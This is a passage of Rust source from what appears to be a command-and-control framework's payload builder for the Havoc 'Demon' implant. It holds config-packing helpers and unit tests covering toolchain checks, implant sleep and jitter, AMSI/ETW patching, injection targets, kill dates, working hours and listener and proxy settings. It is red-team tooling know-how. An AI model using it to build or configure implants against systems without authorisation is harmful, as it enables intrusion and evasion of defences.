    packed |= 1 << 22;
    packed |= (i32::from(start_hour) & 0b01_1111) << 17;
    packed |= (i32::from(start_minute) & 0b11_1111) << 11;
    packed |= (i32::from(end_hour) & 0b01_1111) << 6;
    packed |= i32::from(end_minute) & 0b11_1111;
    Ok(packed)
}

fn parse_hour_minute(value: &str) -> Result<(u8, u8), PayloadBuildError> {
    let (hour, minute) =
        value.split_once(':').ok_or_else(|| PayloadBuildError::InvalidRequest {
            message: "WorkingHours must use `HH:MM-HH:MM`".to_owned(),
        })?;
    let hour = hour.trim().parse::<u8>().map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("invalid working-hours hour `{hour}`"),
    })?;
    let minute = minute.trim().parse::<u8>().map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("invalid working-hours minute `{minute}`"),
    })?;
    if hour > 23 || minute > 59 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "WorkingHours contains an out-of-range hour or minute".to_owned(),
        });
    }
    Ok((hour, minute))
}

fn proxy_url(proxy: &HttpListenerProxyConfig) -> String {
    let scheme = proxy.proxy_type.as_deref().unwrap_or("http");
    format!("{scheme}://{}:{}", proxy.host, proxy.port)
}

fn add_u32(buffer: &mut Vec<u8>, value: u32) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn add_u64(buffer: &mut Vec<u8>, value: u64) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn add_bytes(buffer: &mut Vec<u8>, value: &[u8]) -> Result<(), PayloadBuildError> {
    let len = u32::try_from(value.len()).map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("byte slice length {} exceeds u32::MAX", value.len()),
    })?;
    add_u32(buffer, len);
    buffer.extend_from_slice(value);
    Ok(())
}

fn add_wstring(buffer: &mut Vec<u8>, value: &str) -> Result<(), PayloadBuildError> {
    let mut utf16: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
    utf16.extend_from_slice(&[0, 0]);
    add_bytes(buffer, &utf16)
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::path::Path;

    use super::*;
    use red_cell_common::HttpListenerProxyConfig as DomainHttpListenerProxyConfig;
    use red_cell_common::config::HeaderConfig;
    use serde_json::json;
    use zeroize::Zeroizing;

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_resolves_workspace_root_and_toolchain() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);
        let repo_root = workspace_root()?;

        let service = PayloadBuilderService::from_profile(&profile)?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x64_version.major, 12);
        assert_eq!(service.inner.toolchain.nasm_version.major, 2);
        assert_eq!(service.inner.source_root, repo_root.join("src/Havoc/payloads/Demon"));
        assert_eq!(
            service.inner.shellcode_x64_template,
            repo_root.join("src/Havoc/payloads/Shellcode.x64.bin")
        );
        assert_eq!(
            service.inner.shellcode_x86_template,
            repo_root.join("src/Havoc/payloads/Shellcode.x86.bin")
        );
        assert_eq!(service.inner.default_demon, profile.demon);
        Ok(())
    }

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_with_repo_root_resolves_toolchain_and_havoc_assets()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let service = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        assert_eq!(
            service.inner.toolchain.compiler_x64_version,
            ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() }
        );
        assert_eq!(
            service.inner.toolchain.compiler_x86_version,
            ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() }
        );
        assert_eq!(
            service.inner.toolchain.nasm_version,
            ToolchainVersion { major: 2, minor: 16, patch: 1, raw: "2.16.01".to_owned() }
        );
        assert_eq!(service.inner.source_root, temp.path().join("src/Havoc/payloads/Demon"));
        assert_eq!(
            service.inner.shellcode_x64_template,
            temp.path().join("src/Havoc/payloads/Shellcode.x64.bin")
        );
        assert_eq!(
            service.inner.shellcode_x86_template,
            temp.path().join("src/Havoc/payloads/Shellcode.x86.bin")
        );
        assert_eq!(
            service.inner.dllldr_x64_template,
            temp.path().join("src/Havoc/payloads/DllLdr.x64.bin")
        );
        assert_eq!(
            service.inner.stager_template,
            temp.path().join("payloads/templates/MainStager.c")
        );
        assert_eq!(service.inner.default_demon, profile.demon);
        Ok(())
    }

    #[test]
    fn from_profile_rejects_missing_toolchain_binary() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = temp.path().join("bin/missing-x64-gcc");
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("missing compiler should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("executable does not exist")
                    && message.contains("missing-x64-gcc")
        ));
        Ok(())
    }

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_with_repo_root_resolves_relative_toolchain_paths_against_repo_root()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(
            &temp.path().join("data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"),
        )?;
        let compiler_x86 = write_fake_gcc(
            &temp.path().join("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
        )?;
        let nasm = write_fake_nasm(&temp.path().join("data/nasm/bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(
            Path::new("data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"),
            Path::new("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
            Path::new("data/nasm/bin/nasm"),
        );

        let service = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        Ok(())
    }

    #[test]
    fn from_profile_with_repo_root_reports_missing_relative_toolchain_from_repo_root()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x86 = write_fake_gcc(
            &temp.path().join("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
        )?;
        let nasm = write_fake_nasm(&temp.path().join("data/nasm/bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let missing_relative = Path::new("data/x86_64-w64-mingw32-cross/bin/missing-gcc");
        let profile = constructor_test_profile(missing_relative, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("missing relative compiler should be rejected");

        let expected = temp.path().join(missing_relative);
        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("executable does not exist")
                    && message.contains(&expected.display().to_string())
        ));
        Ok(())
    }

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_rejects_missing_payload_assets() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        std::fs::remove_file(temp.path().join("src/Havoc/payloads/Shellcode.x86.bin"))?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("missing asset should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("required payload asset missing")
                    && message.contains("Shellcode.x86.bin")
        ));
        Ok(())
    }

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_rejects_outdated_gcc() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_executable_with_output(
            &temp.path().join("bin/x64-gcc"),
            "x86_64-w64-mingw32-gcc (GCC) 8.3.0 (Release)",
        )?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("outdated gcc should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("below the minimum required")
                    && message.contains("8.3.0")
        ));
        Ok(())
    }

    // Spawns fake shell scripts via verify_tool_version; flaky under parallel
    // test-suite load (high process-spawn contention, systemd-oomd pressure on
    // this dev VM).  Run explicitly with `cargo test -- --include-ignored`.
    #[test]
    #[ignore]
    fn from_profile_rejects_outdated_nasm() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_executable_with_output(
            &temp.path().join("bin/nasm"),
            "NASM version 2.10.07 compiled on Jan  1 2015",
        )?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("outdated nasm should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("below the minimum required")
                    && message.contains("2.10.07")
        ));
        Ok(())
    }

    #[test]
    fn parse_gcc_version_extracts_version_triple() -> Result<(), Box<dyn std::error::Error>> {
        let output = "x86_64-w64-mingw32-gcc (GCC) 12.2.0 20220819 (Release)\n";
        let path = Path::new("/usr/bin/x86_64-w64-mingw32-gcc");
        let ver = parse_gcc_version(output, path)?;
        assert_eq!(
            ver,
            ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() }
        );
        Ok(())
    }

    #[test]
    fn parse_nasm_version_extracts_version_triple() -> Result<(), Box<dyn std::error::Error>> {
        let output = "NASM version 2.16.01 compiled on Jan  1 2023\n";
        let path = Path::new("/usr/bin/nasm");
        let ver = parse_nasm_version(output, path)?;
        assert_eq!(
            ver,
            ToolchainVersion { major: 2, minor: 16, patch: 1, raw: "2.16.01".to_owned() }
        );
        Ok(())
    }

    #[test]
    fn parse_gcc_version_rejects_unparseable_output() {
        let path = Path::new("/usr/bin/gcc");
        let err = parse_gcc_version("not a version string", path)
            .expect_err("unparseable output should be rejected");
        assert!(matches!(err, PayloadBuildError::ToolchainUnavailable { .. }));
    }

    // ── compiler diagnostic parser ────────────────────────────────────────

    #[test]
    fn parse_compiler_diagnostic_gcc_with_column() {
        let diag = parse_compiler_diagnostic(
            "src/core/Inject.c:42:8: error: 'foo' undeclared (first use in this function)",
        )
        .expect("should parse GCC error with column");

        assert_eq!(diag.filename, "src/core/Inject.c");
        assert_eq!(diag.line, 42);
        assert_eq!(diag.column, Some(8));
        assert_eq!(diag.severity, "error");
        assert_eq!(diag.error_code, None);
        assert_eq!(diag.message, "'foo' undeclared (first use in this function)");
    }

    #[test]
    fn parse_compiler_diagnostic_gcc_warning_with_flag() {
        let diag = parse_compiler_diagnostic(
            "src/Demon.c:10:3: warning: unused variable 'x' [-Wunused-variable]",
        )
        .expect("should parse GCC warning with flag");

        assert_eq!(diag.filename, "src/Demon.c");
        assert_eq!(diag.line, 10);
        assert_eq!(diag.column, Some(3));
        assert_eq!(diag.severity, "warning");
        assert_eq!(diag.error_code.as_deref(), Some("-Wunused-variable"));
        assert_eq!(diag.message, "unused variable 'x'");
    }

    #[test]
    fn parse_compiler_diagnostic_gcc_fatal_error_no_column() {
        let diag = parse_compiler_diagnostic(
            "src/Demon.c:1: fatal error: windows.h: No such file or directory",
        )
        .expect("should parse GCC fatal error without column");

        assert_eq!(diag.filename, "src/Demon.c");
        assert_eq!(diag.line, 1);
        assert_eq!(diag.column, None);
        assert_eq!(diag.severity, "fatal error");
        assert_eq!(diag.error_code, None);
        assert!(diag.message.contains("No such file or directory"));
    }

    #[test]
    fn parse_compiler_diagnostic_nasm_error() {
        let diag = parse_compiler_diagnostic(
            "src/asm/HookDetect.x64.asm:55: error: symbol `_start' undefined",
        )
        .expect("should parse NASM error");

        assert_eq!(diag.filename, "src/asm/HookDetect.x64.asm");
        assert_eq!(diag.line, 55);
        assert_eq!(diag.column, None);
        assert_eq!(diag.severity, "error");
        assert_eq!(diag.message, "symbol `_start' undefined");
    }

    #[test]
    fn parse_compiler_diagnostic_nasm_warning() {
        let diag = parse_compiler_diagnostic(
            "src/asm/Sleep.x64.asm:12: warning: uninitialized space declared in non-BSS section",
        )
        .expect("should parse NASM warning");

        assert_eq!(diag.severity, "warning");
        assert_eq!(diag.line, 12);
    }

    #[test]
    fn parse_compiler_diagnostic_returns_none_for_plain_text() {
        assert!(parse_compiler_diagnostic("stub compiler error").is_none());
        assert!(parse_compiler_diagnostic("In file included from foo.c:").is_none());
        assert!(parse_compiler_diagnostic("").is_none());
    }

    #[test]
    fn parse_compiler_diagnostic_returns_none_for_context_line() {
        // GCC indented caret/context lines should not be treated as diagnostics.
        assert!(parse_compiler_diagnostic("   10 |   int x = foo;").is_none());
        assert!(parse_compiler_diagnostic("      |           ^^^").is_none());
    }

    #[test]
    fn extract_gcc_flag_strips_trailing_bracket_flag() {
        let (msg, code) = extract_gcc_flag("unused variable 'x' [-Wunused-variable]");
        assert_eq!(msg, "unused variable 'x'");
        assert_eq!(code.as_deref(), Some("-Wunused-variable"));
    }

    #[test]
    fn extract_gcc_flag_strips_werror_flag() {
        let (msg, code) =
            extract_gcc_flag("deprecated declaration [-Werror=deprecated-declarations]");
        assert_eq!(code.as_deref(), Some("-Werror=deprecated-declarations"));
        assert_eq!(msg, "deprecated declaration");
    }

    #[test]
    fn extract_gcc_flag_no_flag_returns_message_unchanged() {
        let (msg, code) = extract_gcc_flag("'foo' undeclared");
        assert_eq!(msg, "'foo' undeclared");
        assert!(code.is_none());
    }

    #[test]
    fn find_in_path_or_common_locations_returns_none_for_missing_program() {
        // A program with this name cannot plausibly exist anywhere.
        let found = find_in_path_or_common_locations("__red_cell_nonexistent_tool_zzz__");
        assert_eq!(found, None);
    }

    #[test]
    fn find_in_path_or_common_locations_finds_sh_from_path() {
        // /bin/sh is present on every POSIX system and in PATH; confirms that
        // PATH search works without mutating the global environment.
        let found = find_in_path_or_common_locations("sh");
        assert!(found.is_some(), "sh should be discoverable via PATH");
    }

    #[test]
    fn merged_request_config_applies_profile_defaults() -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Injection":{"Alloc":"Win32","Execute":"Win32"}}"#,
            &DemonConfig {
                sleep: Some(10),
                jitter: Some(25),
                indirect_syscall: true,
                stack_duplication: true,
                sleep_technique: Some("Ekko".to_owned()),
                proxy_loading: Some("RtlCreateTimer".to_owned()),
                amsi_etw_patching: Some("Hardware breakpoints".to_owned()),
                injection: Some(red_cell_common::config::ProcessInjectionConfig {
                    spawn64: Some("C:\\Windows\\System32\\notepad.exe".to_owned()),
                    spawn32: Some("C:\\Windows\\SysWOW64\\notepad.exe".to_owned()),
                }),
                dotnet_name_pipe: Some(r"\\.\pipe\red-cell-dotnet".to_owned()),
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
        )?;

        assert_eq!(config.get("Sleep"), Some(&Value::String("10".to_owned())));
        assert_eq!(config.get("Jitter"), Some(&Value::String("25".to_owned())));
        assert_eq!(config.get("Indirect Syscall"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Stack Duplication"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Sleep Technique"), Some(&Value::String("Ekko".to_owned())));
        assert_eq!(config.get("DotNetNamePipe"), None);
        assert_eq!(
            config["Injection"]["Spawn64"],
            Value::String("C:\\Windows\\System32\\notepad.exe".to_owned())
        );
        assert_eq!(
            config["Injection"]["Spawn32"],
            Value::String("C:\\Windows\\SysWOW64\\notepad.exe".to_owned())
        );
        Ok(())
    }

    #[test]
    fn pack_config_matches_expected_http_layout() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "15",
            "Indirect Syscall": true,
            "Stack Duplication": true,
            "Sleep Technique": "Ekko",
            "Sleep Jmp Gadget": "jmp rbx",
            "Proxy Loading": "RtlCreateTimer",
            "Amsi/Etw Patch": "Hardware breakpoints",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Native/Syscall",
                "Spawn64": "C:\\Windows\\System32\\notepad.exe",
                "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe"
            }
        }))?;
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: Some("1234".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: Some("Mozilla".to_owned()),
            headers: vec!["Header: One".to_owned()],
            uris: vec!["/beacon".to_owned()],
            host_header: Some("front.local".to_owned()),
            secure: true,
            cert: None,
            response: None,
            proxy: Some(DomainHttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: "proxy.local".to_owned(),
                port: 8080,
                username: Some("neo".to_owned()),
                password: Some(Zeroizing::new("trinity".to_owned())),
            }),
        }));

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 15);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\System32\\notepad.exe");
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\SysWOW64\\notepad.exe");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u64(&mut cursor)?, 1234);
        assert_eq!(read_u32(&mut cursor)?, 5_243_968);
        assert_eq!(read_wstring(&mut cursor)?, "POST");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "listener.local");
        assert_eq!(read_u32(&mut cursor)?, 443);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "Mozilla");
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "Header: One");
        assert_eq!(read_wstring(&mut cursor)?, "Host: front.local");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "/beacon");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "http://proxy.local:8080");
        assert_eq!(read_wstring(&mut cursor)?, "neo");
        assert_eq!(read_wstring(&mut cursor)?, "trinity");
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_ends_after_listener_specific_fields() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_wstring(&mut cursor)?, r"\\.\pipe\pivot");
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_http_without_proxy_ends_after_disabled_proxy_flag()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
        }));

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_wstring(&mut cursor)?, "POST");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "listener.local");
        assert_eq!(read_u32(&mut cursor)?, 443);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "Content-type: */*");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "/");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_rejects_dns_listener() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });

        let error = pack_config(&listener, &config).expect_err("dns listener should be rejected");
        assert!(matches!(
            error,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("not supported for Demon payload builds")
        ));
        Ok(())
    }

    fn minimal_config_json() -> Map<String, Value> {
        serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))
        .expect("valid test json")
    }

    fn http_listener_with_method(method: Option<&str>) -> ListenerConfig {
        ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: method.map(str::to_owned),
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }))
    }

    #[test]
    fn pack_config_accepts_post_method() -> Result<(), Box<dyn std::error::Error>> {
        let listener = http_listener_with_method(Some("POST"));
        pack_config(&listener, &minimal_config_json()).expect("POST should be accepted");
        Ok(())
    }

    #[test]
    fn pack_config_accepts_post_method_case_insensitive() -> Result<(), Box<dyn std::error::Error>>
    {
        let canonical = {
            let listener = http_listener_with_method(Some("POST"));
            pack_config(&listener, &minimal_config_json()).expect("POST should be accepted")
        };
        let normalised = {
            let listener = http_listener_with_method(Some("post"));
            pack_config(&listener, &minimal_config_json())
                .expect("lowercase post should be accepted")
        };
        assert_eq!(
            canonical, normalised,
            "method=post must produce identical bytes to method=POST after case normalisation"
        );
        Ok(())
    }

    #[test]
    fn pack_config_rejects_head_method() {
        let listener = http_listener_with_method(Some("HEAD"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("HEAD should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("HEAD")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_rejects_get_method() {
        let listener = http_listener_with_method(Some("GET"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("GET should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("GET")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_rejects_delete_method() {
        let listener = http_listener_with_method(Some("DELETE"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("DELETE should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("DELETE")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_method_none_defaults_to_post() -> Result<(), Box<dyn std::error::Error>> {
        // Producing a config with method=None should yield the same bytes as method=Some("POST").
        let bytes_default = pack_config(&http_listener_with_method(None), &minimal_config_json())?;
        let bytes_explicit =
            pack_config(&http_listener_with_method(Some("POST")), &minimal_config_json())?;
        assert_eq!(bytes_default, bytes_explicit);
        Ok(())
    }

    #[test]
    fn parse_working_hours_encodes_expected_bitmask() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_working_hours(Some("08:00-17:00"))?, 5_243_968);
        Ok(())
    }

    #[test]
    fn parse_working_hours_rejects_end_before_start() {
        let err = parse_working_hours(Some("17:00-08:00"));
        assert!(matches!(
